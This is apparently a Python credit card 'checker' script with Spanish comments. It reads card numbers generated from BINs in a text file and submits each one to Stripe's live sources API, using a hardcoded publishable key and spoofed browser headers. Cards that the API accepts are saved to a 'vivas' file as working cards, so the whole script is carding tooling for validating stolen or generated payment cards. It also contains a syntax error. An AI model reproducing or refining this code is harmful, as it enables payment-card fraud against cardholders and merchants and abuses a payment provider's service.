#Este verificador no verifica el cvc
#Solo verifica la cc sin cobro 
#x3las70n3

import requests
import json
from time import sleep
vivas=open("vivas.txt","a")

#Esta funcion lee los archivos que se encuentran en el archivo bin.txt
#Asegurate que el formato de los bines generados sea el correcto 

def datos(cont):
    dato=open("bin.txt","r")
    leer=dato.readlines()
    con=len(leer)-cont
    cc=leer[con]
    return cc,con
#Este bucle va a verificar la cantidad de cc generadas y cuando se acabe la lista terminara y guardara
#los archivos en un formato llamado vivas.txt

n=1
while True:
#    n=1
    cc=datos(n)[0].split("|")[0]
    mes=datos(n)[0].split("|")[1]

    ano=datos(n)[0].split("|")[2]
    cvc=datos(n)[0].split("|")[3].split("\n")[0]
#cvc="100"
    con=datos(1)[1]
#def checker(num):
    #num=1
#    card,cont=datos(num)
#    cc=card.split("|")[0]
#    cvc=card.split("|")[1]
#    mes=card.split("|")[2]
#    ano=card.split("|")[3]
    #return cc,cvc,mes,ano

 #   pass
    headers={
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "application/json",
        "Accept-Language": "es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "https://js.stripe.com/",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://js.stripe.com",
        "Content-Length": "460",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site"

        }
#Esta es la respuesta que se le enviara al servidor
#
    data={
        "type":"card",
        "amount":"300",
        "currency":"USD",
        "owner[address][country]":"MX",
        "owner[email]":"user140@gmail.com",
        "card[number]":cc,
        "card[cvc]":cvc,
        "card[exp_month]":mes,
        "card[exp_year]":ano,
        "guid":"aab1478a-c5df-4c88-87cb-962a8e88fd3fd5c465",
        "muid":"1a129b1c-0e4c-4065-b062-b224f50e0734ccafba",
        "sid":"13aa651d-e6e6-408e-8cd3-f56aec96c2dcf6bd87",
        "payment_user_agent":"stripe.js%2F025249863%3B+stripe-js-v3%2F025249863&time_on_page=1048064",
        "key":"pk_live_rZXIoQXJuh9awHHfmSAUf8zT"

        }





    url="https://api.stripe.com/v1/sources"

 #   return headers,data,url


#while True:
#    headers,data,url=checker(n)
#r=requests.session()
    
    req=requests.post(url,data=data,headers=headers,timeout=5)
    print(req.status_code)
    #print(data)
    sleep(2)
    js=req.json()
    dump=json.dumps(js)
    n=n+1
    print(dump)
    if req.status_code == 200:
        #with open("vivas.txt","w") as f:
            vivas.write(cc+"|"+mes+"|"+ano+"|"+cvc))
            vivas.write("\n")
            vivas.flush()
    else:
        pass
    if n == con:
        
        break
    #    print("res")
